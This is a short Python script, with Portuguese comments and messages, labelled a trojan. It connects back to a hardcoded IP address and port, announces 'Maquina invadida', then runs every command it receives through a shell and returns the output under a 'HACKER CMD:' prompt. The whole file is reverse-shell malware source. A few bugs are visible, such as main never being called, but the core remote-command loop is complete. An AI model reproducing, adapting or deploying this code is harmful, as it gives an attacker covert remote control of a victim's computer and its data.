#Trojan em python

import socket
import subprocess
import time

ip = "192.168.0.100"
port = 1212
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def conectar(ip, port):
        try:
            s.connect((ip, port))
            s.send("Maquina invadida, Pressione Enter para continuar")
            return s
        except:
            main(s)

def shell(s):
    while True:
        try:
            dados = s.recv(1024)
            proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            saida = proc.stdout.read() + proc.stderr.read()
            s.send(saida+"\n")
            s.send("HACKER CMD:")
        except:
            main(s)


def main(s):
    s_connetc = conectar(ip, port)
    if(s_connetc):
        shell(s_connetc)
    else:
        print("Aguarde reconectando")
